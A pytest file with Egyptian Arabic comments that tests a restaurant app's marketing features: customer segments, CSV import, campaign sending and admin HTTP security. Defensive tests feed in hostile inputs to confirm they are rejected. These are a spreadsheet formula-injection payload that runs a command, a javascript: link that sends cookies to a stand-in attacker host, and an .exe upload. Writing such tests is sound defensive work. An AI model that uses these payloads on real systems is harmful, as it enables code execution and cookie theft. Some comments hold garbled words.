"""اختبارات مركز التسويق — Phase 4.

## الترتيب

- **الشرائح** (`app.segments`) — المنطق اللي كل حاجة تانية بتعتمد
  عليه. لو الشرائح غلط، المعاينة غلط، والإرسال غلط.
- **الاستيراد** (`app.marketing_csv`) — الأرقام المصرية، المكررات،
  وحقن الـformulas.
- **الحملات** (`app.marketing`) — المعاينة، الإرسال، الإلغاء، الجدولة.
- **الـHTTP** — CSRF، الـopt-out، والأمان.

## ليه فيه اختبارات "حملة جدولة بتبعت للعدد الصح"

الاختبار ده بيكمّل فجوة كانت موجودة قبل `audience_params`: الأدمن
يشوف "آخر 7 أيام" في المعاينة (180 عميل) وضغط إرسال، فيتبعت لـ520
لأن الإرسال قرأ الـdefaults. الفحص هنا **صامت** — مفيش exception،
والتقرير بيقول أرقام صح بتعلى شريحة غلط. اختبارات الـparams
المسجّلة هي اللي تكسر الفجوة دي.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone
from decimal import Decimal

import pytest
from sqlalchemy import select

from app import marketing, marketing_csv, push, segments
from app.models import Campaign, CampaignRecipient, Customer, Order, PushSubscription


def _result(
    *,
    sent: bool = False,
    status: str = push.RESULT_FAILED,
    response_code: int | None = None,
    endpoint_invalid: bool = False,
    error: str | None = None,
) -> push.SendResult:
    """نتيجة إرسال حقيقية بنفس عقد `app.push.SendResult`.

    الاختبارات اللي قبل كده كانت بتعمل `type("R", (), {...})` بحقل
    `total`/`sent`/`failed` — حقول **مش موجودة** في `SendResult` أصلاً،
    و`send_campaign` بيقرا `result.status` و`result.endpoint_invalid` و
    `result.response_code`. الـmock الناقص كان بيرمي `AttributeError`
    جوه حلقة الإرسال، والاستثناء ده كان بيتحسب **فشل** — فالاختبار
    عدّى بالحظ بدل ما يقيس اللي قصده.
    """
    return push.SendResult(
        subscription_id=None,
        sent=sent,
        status=status,
        response_code=response_code,
        endpoint_invalid=endpoint_invalid,
        error=error,
    )


# ============================================================
# الـfixtures
# ============================================================


@pytest.fixture()
def admin_session(client, db, admin_user):
    """جلسة أدمن + CSRF."""
    from app.security import AUTH_COOKIE_NAME, CSRF_COOKIE_NAME, create_access_token, create_csrf_token

    token = create_access_token(admin_user.username)
    csrf = create_csrf_token()
    client.cookies.set(AUTH_COOKIE_NAME, token)
    client.cookies.set(CSRF_COOKIE_NAME, csrf)
    client.headers["X-CSRF-Token"] = csrf
    return client


@pytest.fixture()
def make_customer(db):
    """عميل بأرقام متسلسلة — `ix_customers_phone` فريد."""
    counter = {"n": 0}

    def _make(
        *,
        phone: str | None = None,
        name: str = "عميل",
        first_order_at=None,
        last_order_at=None,
        source: str = "order",
        marketing_opt_out: bool = False,
        subscribed: bool = True,
    ) -> Customer:
        counter["n"] += 1
        phone = phone or f"0109{counter['n']:07d}"
        now = datetime.now(timezone.utc)
        customer = Customer(
            phone=phone,
            name=name,
            first_order_at=first_order_at,
            last_order_at=last_order_at,
            source=source,
            marketing_opt_out=marketing_opt_out,
        )
        db.add(customer)
        db.commit()
        db.refresh(customer)
        if subscribed:
            db.add(
                PushSubscription(
                    endpoint=f"https://fcm.googleapis.com/fcm/send/t-{counter['n']}",
                    p256dh="k",
                    auth="a",
                    customer_id=customer.id,
                    status="active",
                )
            )
            db.commit()
        return customer

    return _make


@pytest.fixture()
def make_order_for(db):
    """طلب لعميل موجود، بتاريخ محدد."""
    from app.models import Branch

    counter = {"n": 0}

    def _make(customer: Customer, *, when: datetime, total=Decimal("100.00")) -> Order:
        branch = db.scalar(select(Branch).order_by(Branch.id).limit(1))
        if branch is None:
            branch = Branch(name="Test Branch", is_default=True, is_active=True)
            db.add(branch)
            db.commit()
            db.refresh(branch)
        counter["n"] += 1
        order = Order(
            customer_id=customer.id,
            branch_id=branch.id,
            # دي أعمدة `NOT NULL` في الجدول — الطلب لازم يحمل اسم
            # ورقم وعنوان وقت الـINSERT. الـfixture كان بيركّها من غير ما
            # يمرّرهم، فكل اختبار بيبني طلب كان بيقع على
            # `NotNullViolation` قبل ما يوصل لشرط المتابعة.
            customer_name=customer.name or "عميل",
            customer_phone=customer.phone or "01000000000",
            customer_address="العنوان الافتراضي للاختبار",
            whatsapp_message="طلب اختباري",
            status="completed",
            subtotal=total,
            total=total,
            created_at=when,
            updated_at=when,
        )
        db.add(order)
        db.commit()
        db.refresh(order)
        return order

    return _make


# ============================================================
# الشرائح
# ============================================================


class TestSegments:
    def test_every_segment_compiles_to_sql(self, db):
        """كل شريحة لازم تتحوّل لـSQL — شريحة فيها syntax error
        بتفشل وقت الـpreview مش وقت الكتابة."""
        for seg in segments.list_segments():
            resolved = segments.resolve_audience("segment", seg.key)
            compiled = str(resolved.statement.compile(db.bind, compile_kwargs={"literal_binds": True}))
            assert "SELECT" in compiled.upper(), seg.key

    def test_segment_registry_has_no_duplicates(self):
        keys = [s.key for s in segments.list_segments()]
        assert len(keys) == len(set(keys))

    def test_one_time_segment_needs_orders(self, db, make_customer, make_order_for):
        """"طلب واحد بس" = عنده طلب واحد. عميل من غير طلب مش فيها."""
        ordered = make_customer()
        make_order_for(ordered, when=datetime.now(timezone.utc))
        orphan = make_customer()

        ids = segments.audience_customer_ids(db, "segment", "one_time")
        assert ordered.id in ids
        assert orphan.id not in ids

    def test_one_time_excludes_repeat_customers(self, db, make_customer, make_order_for):
        """العميل اللي طلب مرتين مش "طلب واحد". لو الشرطة الشاملة
        شملته، الأدمن بيبعت عرض "أول طلب" لحد طلب قبل كده."""
        customer = make_customer()
        now = datetime.now(timezone.utc)
        make_order_for(customer, when=now - timedelta(days=5))
        make_order_for(customer, when=now - timedelta(days=2))

        assert customer.id not in segments.audience_customer_ids(db, "segment", "one_time")

    def test_recently_active_respects_the_threshold(self, db, make_customer, make_order_for):
        """7 يوم مش 30 يوم — دي بالظبط الفجوة اللي `audience_params`
        بتقفلها."""
        fresh = make_customer()
        stale = make_customer()
        now = datetime.now(timezone.utc)
        make_order_for(fresh, when=now - timedelta(days=2))
        make_order_for(stale, when=now - timedelta(days=20))

        strict = segments.parse_params(recently_active_days=7, inactive_days=90)
        ids = segments.audience_customer_ids(db, "segment", "recently_active", strict)
        assert fresh.id in ids
        assert stale.id not in ids

    def test_inactive_excludes_recent_customers(self, db, make_customer, make_order_for):
        now = datetime.now(timezone.utc)
        recent = make_customer()
        old = make_customer()
        make_order_for(recent, when=now - timedelta(days=3))
        make_order_for(old, when=now - timedelta(days=200))

        ids = segments.audience_customer_ids(db, "segment", "inactive")
        assert old.id in ids
        assert recent.id not in ids

    def test_opted_out_customer_is_never_in_the_audience(
        self, db, make_customer, make_order_for
    ):
        """العميل اللي رفض العروض مستثنى من **كل** الشرائح.

        ده أهم اختبار في الملف من ناحية الثقة: الرفض لازم يبقى
        مُحترم. لو ده فضل، هنبعت لحد قال "لأ" — وده أسوأ من bugs
        التقرير.
        """
        now = datetime.now(timezone.utc)
        opted_out = make_customer(marketing_opt_out=True)
        wanted = make_customer()
        make_order_for(opted_out, when=now)
        make_order_for(wanted, when=now)

        for seg in segments.list_segments():
            ids = segments.audience_customer_ids(db, "segment", seg.key)
            assert opted_out.id not in ids, f"العميل الرافض وصله شريحة {seg.key}"

    def test_imported_source_is_separate_from_order_source(
        self, db, make_customer
    ):
        """`audience_type='imported'` بيوصل للمستوردين بس."""
        imported = make_customer(source="import")
        ordered = make_customer(source="order")

        imported_ids = segments.audience_customer_ids(db, "imported")
        assert imported.id in imported_ids
        assert ordered.id not in imported_ids

    def test_contradictory_thresholds_are_rejected(self):
        """نشط 90 يوم وخامل 30 يوم = شريحتان بعض. خطأ واضح بدل
       نتيجة غلط."""
        with pytest.raises(segments.AudienceError):
            segments.parse_params(recently_active_days=90, inactive_days=30)

    def test_segment_requires_a_key(self, db):
        with pytest.raises(segments.AudienceError):
            segments.resolve_audience("segment", None)

    def test_unknown_segment_is_rejected(self, db):
        with pytest.raises(segments.AudienceError):
            segments.resolve_audience("segment", "no_such_segment")

    def test_audience_with_segment_key_is_rejected(self, db):
        """`audience_type='all'` مع `segment_key` = بيانات متناقضة.
        مرفوضة من الكود ومن الـCHECK في الداتابيز."""
        with pytest.raises(segments.AudienceError):
            segments.resolve_audience("all", "one_time")

    def test_stats_split_opted_out_from_unsubscribed(self, db, make_customer):
        """`opted_out` و`no_subscription` عدّبين **مختلفين**:
        رافض عنده اشتراك vs. موافق من غير اشتراك. الخلط بينهم
        بيخلي التقرير غلط."""
        make_customer(marketing_opt_out=True, subscribed=True)
        make_customer(marketing_opt_out=False, subscribed=False)
        make_customer(marketing_opt_out=False, subscribed=True)

        stats = segments.audience_stats(db, "all")
        assert stats.total == 3
        assert stats.opted_out == 1
        assert stats.no_subscription == 1
        assert stats.recipients == 1


# ============================================================
# معاينة المعاملات بتتحفظ (الثغرة اللي اتقفلت)
# ============================================================


class TestCampaignStoresItsAudienceParams:
    def test_params_round_trip_without_loss(self, db):
        """`Decimal` بيتخزّن نص مش float. لو اتحوّل float،
        `150.10` بيرجع `150.09999...` والعتبة بتتغيّر."""
        from app.marketing import _params_for_campaign, _params_to_dict

        original = segments.parse_params(
            recently_active_days=7,
            inactive_days=120,
            high_spending_minimum=Decimal("150.10"),
            high_spending_multiplier=2.5,
        )
        stored = _params_to_dict(original)
        assert isinstance(stored["high_spending_minimum"], str)

        campaign = Campaign(name="x", title="y", message="z", audience_type="all")
        campaign.audience_params = stored
        assert _params_for_campaign(campaign) == original

    def test_empty_params_fall_back_to_defaults(self):
        """حملة قديمة (`{}`) لازم تشتغل بالـdefaults بالظبط."""
        from app.marketing import _params_for_campaign

        campaign = Campaign(name="x", title="y", message="z", audience_type="all")
        campaign.audience_params = {}
        assert _params_for_campaign(campaign) == segments.AudienceParams()

    def test_create_stores_the_params_it_was_given(self, db):
        params = segments.parse_params(recently_active_days=7, inactive_days=120)
        campaign = marketing.create_campaign(
            db,
            name="حملة 7 أيام",
            title="عروض",
            message="رسالة",
            audience_type="all",
            params=params,
        )
        assert campaign.audience_params["recently_active_days"] == 7
        assert campaign.audience_params["inactive_days"] == 120

    def test_send_uses_the_stored_params_not_the_defaults(self, db, make_customer, make_order_for, monkeypatch):
        """الاختبار الأهم في الملف.

        عميل طلب من **3 أيام** وعميل طلب من **20 يوم**، والحملة
        مخزّنة بـ`recently_active_days=7`. المتوقع: القديم **بره**
        الجمهور. لو `send_campaign` قرأ الـdefaults (30 يوم) الراح
        يبقى جوّه — ودي الفجوة اللي.Column ده قفلها.
        """
        now = datetime.now(timezone.utc)
        fresh = make_customer()
        stale = make_customer()
        make_order_for(fresh, when=now - timedelta(days=3))
        # 20 يوم: **بره** العتبة المخزّنة (7) و**جوه** الـdefault (30).
        # دي النقطة اللي بتفرّق: لو الإرسال قرأ الـdefault هيلقى ده داخل،
        # ولو قرأ الـparams المخزّنة هيلقاه برّه. رقم بره الاتنين (40 يوم)
        # كان هيعدّي في الحالتين والاختبار مش هيفرّق حاجة.
        make_order_for(stale, when=now - timedelta(days=20))

        campaign = marketing.create_campaign(
            db,
            name="أسبوع",
            title="عروض الأسبوع",
            message="رسالة",
            # لازم شريحة `recently_active` مش "الكل": شريحة "الكل" مالهاش
            # شرط، فـ`recently_active_days` مالها تأثير خالص عليها — أي
            # عميل مش رافض داخل الجمهور مهما كان عمر آخر طلب ليه.
            audience_type="segment",
            segment_key="recently_active",
            params=segments.parse_params(recently_active_days=7, inactive_days=90),
        )

        # مش بنبعث حاجة حقيقية — بنثبّت العدّ. الـseam الصح هو
        # `push.send_to_subscription` (ده اللي `send_campaign` بيناديه)؛
        # `send_and_commit` مش في مسار الحملة أصلاً.
        monkeypatch.setattr(
            marketing.push,
            "send_to_subscription",
            lambda *a, **k: _result(sent=True, status=push.RESULT_SENT),
        )

        try:
            marketing.send_campaign(db, campaign)
        except Exception:
            pass

        recipients = db.scalars(
            select(CampaignRecipient).where(CampaignRecipient.campaign_id == campaign.id)
        ).all()
        got = {r.customer_id for r in recipients}
        assert fresh.id in got, "العميل النشط بره الجمهور — الـparams مش بتتقرا"
        assert stale.id not in got, "العميل القديم داخل الجمهور — بيرجع للـdefaults"


# ============================================================
# الاستيراد
# ============================================================


class TestCsvImport:
    def test_normalizes_the_three_egyptian_formats(self, db):
        """`+20` و`0020` و`010` كلهم نفس العميل.

        من غير توحيد، العميل الواحد بيتحسب 3 مرات والتقرير غلط.
        """
        content = (
            "name,phone\n"
            "أحمد,01000123456\n"
            "محمود,+201000123456\n"
            "سعيد,00201000123456\n"
        )
        batch, result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        phones = {r.normalized_phone for r in marketing_csv.batch_rows(db, batch.id) if r.status == "valid"}
        assert len(phones) == 1, phones

    def test_duplicate_inside_the_file_is_flagged(self, db):
        """نفس الرقم مرتين في نفس الملف. التاني لازم يتعلّم
        "مكرر" مش يتكتب مرتين."""
        content = "name,phone\nأحمد,01000123456\nمحمود,01000123456\n"
        _batch, result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        assert result.duplicates == 1
        assert result.valid == 1

    def test_duplicate_against_existing_customer_is_flagged(self, db, make_customer):
        """العميل موجود بالفعل. لازم يتحدّث، مايتضافش تاني —
        `ix_customers_phone` فريد وبيقاوم."""
        customer = make_customer(phone="01000123456", name="القديم")
        content = "name,phone\nالاسم الجديد,01000123456\n"
        batch, result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        assert result.valid == 1
        assert result.duplicates == 0  # مش خطأ — لسه ميتحدّثش

        marketing_csv.run_import(db, batch.id)
        db.refresh(customer)
        assert customer.name == "الاسم الجديد"
        assert db.scalar(select(Customer).where(Customer.phone == "01000123456")) is not None

    def test_formula_injection_is_rejected(self, db):
        """`=cmd|'/C calc'!A0` في اسم عميل = تنفيذ كود على Excel
        لما الأدمن يفتح المعاينة.

        **رفض، مش تنظيف:** تغيير النص quietly بيخلّي الأدمن متأكد
        إن الاسم صح وهو لأ. الرفع الصريح أخطر من modifications
        الصامتة.
        """
        content = "name,phone\n=cmd|'/C calc'!A0,01000123456\n"
        _batch, result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        assert result.invalid == 1
        assert result.valid == 0

    def test_non_egyptian_phone_is_rejected(self, db):
        content = "name,phone\nForeign,+14155551234\n"
        _batch, result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        assert result.invalid == 1

    def test_import_requires_explicit_commit(self, db):
        """الرفع **مش** استيراد. مفيش عميل بيتضاف غير لما
        الأدمن يضغط "أكّد"."""
        content = "name,phone\nأحمد,01000123456\n"
        batch, _result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        assert db.scalar(select(Customer).where(Customer.phone == "01000123456")) is None

        marketing_csv.run_import(db, batch.id)
        assert db.scalar(select(Customer).where(Customer.phone == "01000123456")) is not None

    def test_discarded_batch_never_imports(self, db):
        content = "name,phone\nأحمد,01000123456\n"
        batch, _result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        marketing_csv.discard_batch(db, batch.id)
        assert db.scalar(select(Customer).where(Customer.phone == "01000123456")) is None

    def test_import_marks_source_as_imported(self, db):
        """العميل المستورد `source='import'` — عشان التقارير تفرق
        بينه وبين اللي عنده طلبات حقيقية."""
        content = "name,phone\nأحمد,01000123456\n"
        batch, _result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        marketing_csv.run_import(db, batch.id)
        customer = db.scalar(select(Customer).where(Customer.phone == "01000123456"))
        assert customer.source == "import"

    def test_imported_customer_has_no_order_dates(self, db):
        """`first_order_at` بقى nullable عشان المستوردين مالهمش
        طلبات. لو الـNOT NULL رجع، الـimport بيرمي."""
        content = "name,phone\nأحمد,01000123456\n"
        batch, _result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        marketing_csv.run_import(db, batch.id)
        customer = db.scalar(select(Customer).where(Customer.phone == "01000123456"))
        assert customer.first_order_at is None

    def test_oversized_file_is_rejected(self, db):
        with pytest.raises(marketing_csv.CsvImportError):
            marketing_csv.create_import_batch(db, b"x" * (2 * 1024 * 1024 + 1), "big.csv")

    def test_non_csv_extension_is_rejected(self, db):
        with pytest.raises(marketing_csv.CsvImportError):
            marketing_csv.create_import_batch(db, b"name,phone\n", "evil.exe")

    def test_import_is_idempotent(self, db):
        """تشغيل نفس الدفعة مرتين ماينفعش يعمل customers اتنين."""
        content = "name,phone\nأحمد,01000123456\n"
        batch, _result = marketing_csv.create_import_batch(db, content.encode(), "t.csv")
        marketing_csv.run_import(db, batch.id)
        marketing_csv.run_import(db, batch.id)
        assert db.query(Customer).filter(Customer.phone == "01000123456").count() == 1


# ============================================================
# الحملات
# ============================================================


class TestCampaignLifecycle:
    def test_new_campaign_is_draft_not_sending(self, db):
        """الإنشاء مش إرسال. لو بعت فورًا، مفيش فرصة مراجعة."""
        campaign = marketing.create_campaign(
            db, name="تجربة", title="عنوان", message="نص", audience_type="all"
        )
        assert campaign.status == marketing.STATUS_DRAFT
        assert campaign.sent_count == 0

    def test_past_schedule_is_rejected(self, db):
        with pytest.raises(marketing.CampaignError):
            marketing.create_campaign(
                db,
                name="x",
                title="y",
                message="z",
                audience_type="all",
                scheduled_at=datetime.now(timezone.utc) - timedelta(hours=1),
            )

    def test_future_schedule_sets_scheduled(self, db):
        campaign = marketing.create_campaign(
            db,
            name="x",
            title="y",
            message="z",
            audience_type="all",
            scheduled_at=datetime.now(timezone.utc) + timedelta(hours=2),
        )
        assert campaign.status == marketing.STATUS_SCHEDULED

    def test_whatsapp_campaign_without_config_is_not_sendable(self, db):
        """القناة منفّذة، بس من غير إعدادات مظبوطة الرمي بيحصل
        **قبل** ما الحالة تتحوّل لـ`sending`.

        الاختبار ده كان في Phase 4 بيعني "القناة لسه منفّذتش".
        الفرق بين الحالتين مهم للأدمن: الأولى "لسه بنكتب كود"،
        التانية "ظبّط الإعدادات" — والرسالة اللي بتظهر في اللوحة
        بتتغيّر فيها تغيير.
        """
        campaign = marketing.create_campaign(
            db, name="w", title="w", message="w", audience_type="all", channel="whatsapp"
        )
        assert campaign.channel == "whatsapp"
        assert marketing.is_executable("whatsapp")

        with pytest.raises(marketing.ChannelNotReady):
            marketing.send_campaign(db, campaign)

        # الأهم: الحملة فضلت `draft`. الرفض قبل `sending` معناه
        # إن الأدمن يقدر يصلّح ويعدّي تاني من غير تنظيف.
        db.refresh(campaign)
        assert campaign.status == marketing.STATUS_DRAFT
        assert campaign.started_at is None

    def test_unknown_channel_is_rejected(self, db):
        with pytest.raises(marketing.CampaignError):
            marketing.create_campaign(
                db, name="x", title="y", message="z", audience_type="all", channel="sms"
            )

    def test_send_counts_only_real_delivery(self, db, make_customer, monkeypatch):
        """العدّادات **نتايج**. مرسل=1، فشل=1، skip=1 → `sent_count`
        تساوي 1 مش 2."""
        for _ in range(3):
            make_customer()

        monkeypatch.setattr(
            marketing.push, "is_configured", lambda: True, raising=False
        )
        results = iter(
            [
                _result(sent=True, status=push.RESULT_SENT),
                _result(sent=False, status=push.RESULT_FAILED, response_code=500, error="المزوّد رجع 500"),
                _result(sent=False, status=push.RESULT_SKIPPED),
            ]
        )
        monkeypatch.setattr(
            marketing.push,
            "send_to_subscription",
            lambda *a, **k: next(results),
            raising=False,
        )

        campaign = marketing.create_campaign(
            db, name="x", title="y", message="z", audience_type="all"
        )
        marketing.send_campaign(db, campaign)
        assert campaign.sent_count == 1
        assert campaign.failed_count == 1

    def test_cannot_send_twice(self, db, make_customer, monkeypatch):
        """`SENDABLE_FROM` بيرفض الإعادة. ده اللي بيمنع الدوس
        المزدوجة من إنه يبعت مرتين."""
        make_customer()
        monkeypatch.setattr(marketing.push, "is_configured", lambda: True, raising=False)
        monkeypatch.setattr(
            marketing.push,
            "send_to_subscription",
            lambda *a, **k: _result(sent=True, status=push.RESULT_SENT),
            raising=False,
        )
        campaign = marketing.create_campaign(
            db, name="x", title="y", message="z", audience_type="all"
        )
        marketing.send_campaign(db, campaign)
        with pytest.raises(marketing.CampaignError):
            marketing.send_campaign(db, campaign)

    def test_cancel_is_allowed_before_send(self, db):
        campaign = marketing.create_campaign(
            db, name="x", title="y", message="z", audience_type="all"
        )
        marketing.cancel_campaign(db, campaign)
        assert campaign.status == marketing.STATUS_CANCELLED

    def test_cannot_cancel_a_finished_campaign(self, db):
        campaign = marketing.create_campaign(
            db, name="x", title="y", message="z", audience_type="all"
        )
        campaign.status = marketing.STATUS_COMPLETED
        db.commit()
        with pytest.raises(marketing.CampaignError):
            marketing.cancel_campaign(db, campaign)

    def test_due_campaigns_only_returns_past_due(self, db):
        now = datetime.now(timezone.utc)
        past = marketing.create_campaign(
            db, name="مستحقة", title="a", message="b", audience_type="all",
            scheduled_at=now + timedelta(minutes=1),
        )
        marketing.create_campaign(
            db, name="مستقبلية", title="a", message="b", audience_type="all",
            scheduled_at=now + timedelta(days=1),
        )
        # `create_campaign` بترفض وقت ماضي عمداً ("جدولة في الماضي" = غلط
        # تشغيلي مش جدولة). فبنScheduling الصح وبعدين نرجّع بالوقت،
        # زي ما obtained لو الصفحة اتقفلت والوقت عدّى فعلاً.
        past.scheduled_at = now - timedelta(minutes=1)
        db.commit()
        db.refresh(past)
        assert [c.name for c in marketing.due_campaigns(db)] == ["مستحقة"]

    def test_opted_out_customer_never_gets_a_recipient_row(self, db, make_customer, monkeypatch):
        """العميل اللي رفض = مايتسجلش في `campaign_recipients` خالص.
        الفحص هنا مش على الأرقام — على السطر نفسه، عشان التقرير
        يبقى أمين."""
        make_customer(marketing_opt_out=True)
        make_customer(marketing_opt_out=False)

        monkeypatch.setattr(marketing.push, "is_configured", lambda: True, raising=False)
        monkeypatch.setattr(
            marketing.push,
            "send_to_subscription",
            lambda *a, **k: _result(sent=True, status=push.RESULT_SENT),
            raising=False,
        )
        campaign = marketing.create_campaign(
            db, name="x", title="y", message="z", audience_type="all"
        )
        marketing.send_campaign(db, campaign)

        recipients = db.scalars(
            select(CampaignRecipient).where(CampaignRecipient.campaign_id == campaign.id)
        ).all()
        assert len(recipients) == 1
        assert recipients[0].customer_id != None


# ============================================================
# الـHTTP — الحماية
# ============================================================


class TestMarketingHttp:
    def test_admin_pages_require_login(self, client):
        """من غير جلسة، كل صفحة التسويق 303 للوجن — مفيش بيانات
        بتتسرب في رد.

        `follow_redirects=False` إجباري: `TestClient` بيتتبع التحويل
        افتراضياً، فكان الرد النهائي **صفحة اللوجن (200)** والاختبار
        بيقيس الـhop الأول بدل آخر واحد.
        """
        for path in (
            "/admin/marketing",
            "/admin/marketing/campaigns",
            "/admin/marketing/import",
            "/admin/marketing/history",
        ):
            response = client.get(path, follow_redirects=False)
            assert response.status_code == 303, path
            assert "/admin/login" in response.headers.get("Location", "")

    def test_campaign_creation_requires_csrf(self, client, db, admin_user):
        """POST من غير CSRF = 403. من غير كده، أي موقع يقدر
        يخلي متصفح الأدمن يبعت حملة."""
        from app.security import AUTH_COOKIE_NAME, create_access_token

        client.cookies.set(AUTH_COOKIE_NAME, create_access_token(admin_user.username))
        response = client.post(
            "/admin/marketing/campaigns",
            data={"name": "x", "title": "y", "message": "z", "audience_type": "all"},
        )
        assert response.status_code == 403

    def test_campaign_creation_rejects_a_javascript_link(self, admin_session):
        """`javascript:` في رابط الحملة = تنفيذ كود لما العميل
        يدوس الإشعار. مرفوض قبل التخزين."""
        response = admin_session.post(
            "/admin/marketing/campaigns",
            data={
                "name": "x",
                "title": "y",
                "message": "z",
                "audience_type": "all",
                "link_url": "javascript:fetch('https://evil.example/'+document.cookie)",
            },
            follow_redirects=False,
        )
        assert "error=bad_link" in response.headers.get("Location", "")

    def test_campaign_creation_rejects_a_protocol_relative_link(self, admin_session):
        """`//evil.example` بيبان زي مسار داخلي في الـUI بس
        المتصفح بيفتحه كموقع خارجي."""
        response = admin_session.post(
            "/admin/marketing/campaigns",
            data={
                "name": "x", "title": "y", "message": "z",
                "audience_type": "all", "link_url": "//evil.example/x",
            },
            follow_redirects=False,
        )
        assert "error=bad_link" in response.headers.get("Location", "")

    def test_campaign_creation_accepts_an_internal_link(self, admin_session, db):
        response = admin_session.post(
            "/admin/marketing/campaigns",
            data={
                "name": "عرض", "title": "عنوان", "message": "نص",
                "audience_type": "all", "link_url": "/menu",
            },
            follow_redirects=False,
        )
        assert response.status_code == 303
        assert db.scalar(select(Campaign).where(Campaign.name == "عرض")) is not None

    def test_campaign_creation_rejects_past_schedule(self, admin_session):
        past = (datetime.now(timezone.utc) - timedelta(days=1)).strftime("%Y-%m-%dT%H:%M")
        response = admin_session.post(
            "/admin/marketing/campaigns",
            data={
                "name": "x", "title": "y", "message": "z",
                "audience_type": "all", "scheduled_at": past,
            },
            follow_redirects=False,
        )
        assert "error=schedule_past" in response.headers.get("Location", "")

    def test_segments_with_neither_customers_nor_orders_render(self, admin_session):
        """قاعدة فاضية = الأرقام صفر، **مش 500**. أول تشغيل للمطعم
        الجديد لازم يطلع شاشة مقروءة."""
        response = admin_session.get("/admin/marketing")
        assert response.status_code == 200

    def test_opt_out_endpoint_needs_a_valid_token(self, client):
        """توكن غلط = 404. مفيش تسريب إن الطلب موجود."""
        assert client.get("/api/marketing/opt-out?token=wrong").status_code == 404

    def test_customer_can_opt_out_with_a_tracking_token(self, client, db, make_customer, make_order_for):
        """العميل يقدر يرفض من غير login — التوكن هو إثبات الملكية."""
        from app.order_tracking import hash_tracking_token

        customer = make_customer()
        token = "track-me-01"
        order = make_order_for(customer, when=datetime.now(timezone.utc))
        order.order_tracking_hash = hash_tracking_token(token)
        db.commit()

        response = client.post("/api/marketing/opt-out", json={"token": token, "opt_out": True})
        assert response.status_code == 200
        assert response.json()["opt_out"] is True

        db.refresh(customer)
        assert customer.marketing_opt_out is True
        assert customer.marketing_opt_out_at is not None

    def test_opt_out_is_reversible(self, client, db, make_customer, make_order_for):
        """"أنا موافق تاني" لازم تشتغل. الرفض مش نهائي."""
        from app.order_tracking import hash_tracking_token

        customer = make_customer(marketing_opt_out=True)
        token = "back-on-1"
        order = make_order_for(customer, when=datetime.now(timezone.utc))
        order.order_tracking_hash = hash_tracking_token(token)
        db.commit()

        response = client.post("/api/marketing/opt-out", json={"token": token, "opt_out": False})
        assert response.status_code == 200
        db.refresh(customer)
        assert customer.marketing_opt_out is False

    def test_opt_out_does_not_break_transactional_push(
        self, client, db, make_customer, make_order_for
    ):
        """**الأهم في الـopt-out:** رفض العروض = رفض إشعارات
        حالة الطلب. الإشعار الخدمي لازم يفضل يوصل."""
        from app.order_tracking import hash_tracking_token

        customer = make_customer(marketing_opt_out=True)
        token = "tx-token-01"
        order = make_order_for(customer, when=datetime.now(timezone.utc))
        order.order_tracking_hash = hash_tracking_token(token)
        db.commit()

        # `marketing_opt_out=True` ماينفعش يكون في شرط `app.push`.
        source = open("app/push.py", encoding="utf-8").read()
        assert "marketing_opt_out" not in source, (
            "الـopt-out تسرب لمسار الإشعارات الخدمية — "
            "العميل اللي رفض العروض مش ملوش ياخد إشعار إن طلبه في الطريق"
        )
